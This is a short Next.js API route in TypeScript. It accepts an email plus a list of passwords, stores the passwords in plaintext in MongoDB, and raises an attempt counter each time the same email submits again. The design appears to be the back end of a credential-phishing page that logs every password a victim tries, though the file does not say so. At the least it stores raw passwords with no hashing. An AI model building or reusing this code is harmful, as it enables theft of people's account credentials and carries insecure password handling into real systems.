import { NextResponse } from "next/server";
import { connectToDatabase } from "@/lib/mongodb";
import { CredentialModel } from "@/models/Credential";
import { MongoError } from 'mongodb';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, passwords } = body;

    if (!email || !passwords || passwords.length === 0) {
      return NextResponse.json(
        { success: false, message: "Email and passwords are required" },
        { status: 400 }
      );
    }

    await connectToDatabase();

    const existingCredential = await CredentialModel.findOne({ email });

    if (existingCredential) {
      existingCredential.attempts += 1;
      existingCredential.passwords = passwords;
      await existingCredential.save();
    } else {
      await CredentialModel.create({
        email,
        passwords,
        attempts: 1,
        createdAt:  new Date(),
      });
    }

    return NextResponse.json(
      { success: true, message: "Credentials submitted successfully" },
      { status: 200 }
    );
  } catch (error) {
    if (error instanceof MongoError && error.code === 11000) {
      return NextResponse.json(
        { success: false, message: "Email already exists" },
        { status: 400 }
      );
    }
    console.error("Error submitting credentials:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
